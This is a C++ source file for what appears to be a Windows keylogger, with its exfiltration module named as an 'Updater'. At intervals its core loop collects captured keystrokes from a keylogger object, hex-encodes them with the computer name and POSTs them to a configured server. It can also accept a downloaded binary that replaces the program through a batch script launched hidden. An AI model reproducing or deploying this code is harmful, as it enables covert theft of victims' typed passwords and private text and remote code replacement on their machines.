#include "updater.h"

#include "main.h"

string UIntToString(unsigned int val)
{
	char buffer[16] = {0};
	sprintf(buffer, "%u", unsigned int(val));

	return string(buffer);
}

string BinToASCII(unsigned char *data, unsigned int dataLength)
{
	string ascii = "";

	for (int i = 0; i < (int)dataLength; i++)
	{
		char high = (char)I_TO_H((data[i] >> 4));
		char low  = (char)I_TO_H((data[i] & 0xF));

		ascii += high;
		ascii += low;
	}

	return ascii;
}

unsigned char *ASCIIToBin(string ascii, unsigned int *dataLength)
{
	*dataLength = ascii.length() * 2;
	unsigned char *data = new unsigned char[*dataLength];

	const char *str = ascii.c_str();
	
	for (int i = 0; i < (int)*dataLength; i++)
	{
		unsigned char high = (unsigned char)H_TO_I(str[(i << 1)]);
		unsigned char low  = (unsigned char)H_TO_I(str[(i << 1) + 1]);

		data[i] = (high << 4) | low;
	}

	return data;
}

unsigned long ResolveIP(string hostName)
{
    unsigned long hostAddress = inet_addr(hostName.c_str());

    if (hostAddress == INADDR_NONE)
    {
        hostent *host = gethostbyname(hostName.c_str());

        hostAddress = *reinterpret_cast<unsigned long *>(host->h_addr_list[0]);

        if (hostAddress == INADDR_NONE)
        {
			DebugLog("Warning: Unable to resolve hostname '%s'", hostName.c_str());
            return 0;
        }
    }

	return hostAddress;
}

string GetDottedIP(unsigned long ip)
{
	unsigned int oct1 = (ip & 0xFF000000) >> 24;
	unsigned int oct2 = (ip & 0x00FF0000) >> 16;
	unsigned int oct3 = (ip & 0x0000FF00) >> 8;
	unsigned int oct4 = (ip & 0x000000FF);

	char buff[32] = {0};

	sprintf(buff, "%i.%i.%i.%i", oct4, oct3, oct2, oct1);

	return string(buff);
}

int Updater::HTTPRequest(const HTTP_REQUEST *request)
{
	DebugLog("Sending HTTP request...");

	// setup the http post header

	string httpHeader = request->method + " " + string(UPDATE_SERVER_PAGE) + " HTTP/1.1\r\n";

	httpHeader       += "Host: " + string(UPDATE_SERVER_ADDRESS) + "\r\n";
	httpHeader       += "User-Agent: " + string(HTTP_USER_AGENT) + "\r\n";
	
	if (request->method == string("POST"))
	{
		httpHeader       += "Content-Length: " + UIntToString(request->content.length()) + "\r\n";
		httpHeader       += "Content-Type: application/x-www-form-urlencoded\r\n";
	}

	httpHeader       += "\r\n";

	// copy our http request data to a buffer for the sending thread

	string httpRequest = httpHeader + request->content;

	// setup a tcp/ip socket

	SOCKET sock = INVALID_SOCKET;
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (sock == INVALID_SOCKET)
	{
		DebugLog("Error sending HTTP Request, unable to create socket.");
		return 0;
	}

	sockaddr_in remoteSIN;
	memset(&remoteSIN, 0, sizeof(remoteSIN));

	// destined for our update server

	remoteSIN.sin_family = AF_INET;
	remoteSIN.sin_port = htons(request->port);

	remoteSIN.sin_addr.S_un.S_addr = ResolveIP(request->server);

	DebugLog("Resolved server IP to %s", GetDottedIP(remoteSIN.sin_addr.S_un.S_addr).c_str());

	// bind the local endpoint and connect the remote endpoint, if either fails bail out

	if (connect(sock, (sockaddr*)&remoteSIN, sizeof(sockaddr_in)) == SOCKET_ERROR)
	{
		DebugLog("Error sending HTTP Request, unable contact remote server.");
		return 0;
	}

	// and finally send the data

	//DebugLog("HTTP Request Send Contents:\r\n%s", httpRequest.c_str());

	if (send(sock, (const char *)httpRequest.c_str(), httpRequest.length(), 0) == SOCKET_ERROR)
	{
		DebugLog("Error sending HTTP Request, socket send error.");
		return 0;
	}
	
	char *_response = new char [HTTP_MAX_RESPONSE_SIZE];
	memset(_response, 0, HTTP_MAX_RESPONSE_SIZE);

	unsigned int responseSize = 0;

	while (true)
	{
		int receivedBytes = recv(sock, &_response[responseSize], HTTP_MAX_RESPONSE_SIZE - responseSize, 0);
		
		if (receivedBytes == 0)					// connection closed gracefully
		{
			break;
		}
		else if (receivedBytes == SOCKET_ERROR)	// some kind of error in connection (connection lost)
		{
			DebugLog("Error sending HTTP Request, socket unexpectedly terminated.");

			delete [] _response;

			return 0;
		}
		
		responseSize += receivedBytes;

		if (responseSize >= HTTP_MAX_RESPONSE_SIZE)	// too much data for our recv buffer
		{
			DebugLog("Error sending HTTP Request, response larger than expected.");

			delete [] _response;

			return 0;
		}
	}

	// close the connection gracefully

	closesocket(sock);

	string responseHeader = string(_response);

	unsigned int endOfHeader = responseHeader.find("\r\n\r\n");
	
	if (endOfHeader != 0xFFFFFFFF)
	{
		responseHeader = responseHeader.substr(0, endOfHeader);
	}
	else
	{
		DebugLog("Error: Unable to find end of header in HTTP response.");

		delete [] _response;

		return 0;
	}

	unsigned int beginningOfContent = endOfHeader + 4;
	unsigned int contentLength = responseSize - beginningOfContent;

	if (responseHeader.find("200 OK") != -1)
	{
		if (responseHeader.find("Content-Type: application/octet-stream") != -1)
		{
			char *responseContent = &_response[beginningOfContent];
			
			while (*responseContent != 0x0A)
			{
				responseContent++;
				contentLength--;
			}

			responseContent++;
			contentLength--;

			DebugLog("HTTP response includes program update (%i bytes)...", contentLength);

			updateData = new unsigned char[contentLength];
			memcpy(updateData, responseContent, contentLength);

			dataLength = contentLength;
		}
		else
		{
			string responseString = string(&_response[beginningOfContent], contentLength);

			if (responseString != string("Update success"))
			{
				delete [] _response;

				DebugLog("HTTP Request succeeded, but did not receive update confirmation.");
				DebugLog("Response received:\r\n%s", responseString.c_str());
				
				return 0;
			}
		}
	}
	else
	{
		DebugLog("Error sending HTTP Request, HTTP error code in header:\r\n%s", responseHeader.c_str());

		delete [] _response;

		return 0;
	}

	delete [] _response;

	DebugLog("HTTP Request successful.");

	return 1;
}

int Updater::Shutdown()
{
	DebugLog("Shutting down updater...");

	shuttingDown = true;

	WaitForSingleObject(updaterThread, INFINITE);

	int retVal; GetExitCodeThread(updaterThread, (LPDWORD)&retVal);

	return retVal;
}

int Updater::UpdateApplication()
{
	DebugLog("Update data found. Updating application...");

	FILE *updateFile = fopen(appUpdatePath.c_str(), "wb");

	if (!updateFile)
	{
		DebugLog("Error: Unable to write temp app update file.");

		return 0;
	}

	fwrite(updateData, 1, dataLength, updateFile);

	fclose(updateFile);

	string updateScript = ":Repeat\r\n";

	updateScript +=  "del " + myInstaller.GetAppPath() + " /Q\r\n";
	updateScript +=  "if exist " + myInstaller.GetAppPath() + " goto Repeat\r\n";
	updateScript +=  "copy " + appUpdatePath + " " + myInstaller.GetAppPath() + " /y\r\n";
	updateScript +=  "del " + appUpdatePath + " /y\r\n";
	updateScript +=  "start " + myInstaller.GetAppPath() + "\r\n";

	FILE *scriptFile = fopen(scriptPath.c_str(), "wb");

	if (!scriptFile)
	{
		DebugLog("Error: Unable to write temp app update script file.");

		return 0;
	}

	fwrite(updateScript.c_str(), 1, updateScript.length(), scriptFile);

	fclose(scriptFile);

	if (int(ShellExecute(NULL, "open", scriptPath.c_str(), NULL, NULL, SW_HIDE)) <= 32)
	{
		DebugLog("Error executing temp update script.");

		return 0;
	}

	DebugLog("Update setup completed successfully.");

	return 1;
}

int Updater::UpdaterCore()
{
	// delete any unused temporary files

	DeleteFile(scriptPath.c_str());
	DeleteFile(appUpdatePath.c_str());

	// used for timing

	unsigned int ticks           = 0;
	unsigned int lastUpdateTicks = 0;

	string computerName = getenv("ComputerName");

	// core loop

	while (true)
	{
		if ((ticks - lastUpdateTicks) > (UPDATE_INTERVAL * 10))
		{
			DebugLog("Starting update at %s...", GetTimeString());

			myKeyLogger.dataRequested = true;

			WaitForSingleObject(myKeyLogger.dataReady, INFINITE);

			DebugLog("Update data ready...");

			if (myKeyLogger.dataSize)
			{
				HTTP_REQUEST httpRequest;

				httpRequest.server = string(UPDATE_SERVER_ADDRESS);
				httpRequest.port   = UPDATE_SERVER_PORT;
				httpRequest.page   = string(UPDATE_SERVER_PAGE);
				httpRequest.method = string("POST");

				httpRequest.content = string("version=") + string(UPDATE_APP_VERSION) + string("&computer=") + computerName + string("&data=") + BinToASCII(myKeyLogger.data, myKeyLogger.dataSize);

				if (HTTPRequest(&httpRequest))
				{
					DebugLog("Update completed successfully.");
				}
				else
				{
					DebugLog("Error sending update.");

					myKeyLogger.dataError = true;
				}

				myKeyLogger.dataCompleted = true;

				if (updateData)
				{
					if (UpdateApplication())
					{
						DebugLog("Shutting down to update application...");

						if (!PostThreadMessage(mainThreadID, WM_QUIT, NULL, NULL))
						{
							DebugLog("Unable to send shutdown message to main thread.");
						}
					}
					
					delete [] updateData;

					updateData = NULL;
					dataLength =0;
				}
			}
			else
			{
				DebugLog("Not enough update data.");
				
				myKeyLogger.dataError     = true;
				myKeyLogger.dataCompleted = true;
			}

			lastUpdateTicks = ticks;
		}

		if (shuttingDown)
		{
			return 0;
		}

		ticks++;

		Sleep(100); // 10th of a second
	}

	return 1;
}

int Updater::StartUpdater()
{
	// winsock init

	WSADATA wsadata;

	if (WSAStartup(MAKEWORD(2, 2), &wsadata))
	{
		DebugLog("Error initializing winsock.");
		return 0;
	}

	updaterThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&StartUpdaterCore, (void*)this, 0, NULL);

	if (!updaterThread)
	{
		DebugLog("Error creating updater thread.");
		return 0;
	}

	appUpdatePath = myInstaller.GetInstallPath() + "\\updatetemp2.dat";
	scriptPath    = myInstaller.GetInstallPath() + "\\updatetemp3.bat";

	shuttingDown = false;

	updateData = NULL;
	dataLength = 0;

	return 1;
}

int StartUpdaterCore(void *_myUpdater)
{
	DebugLog("Updater thread start...");

	Updater *myUpdater = (Updater*)_myUpdater;

	return myUpdater->UpdaterCore();
}
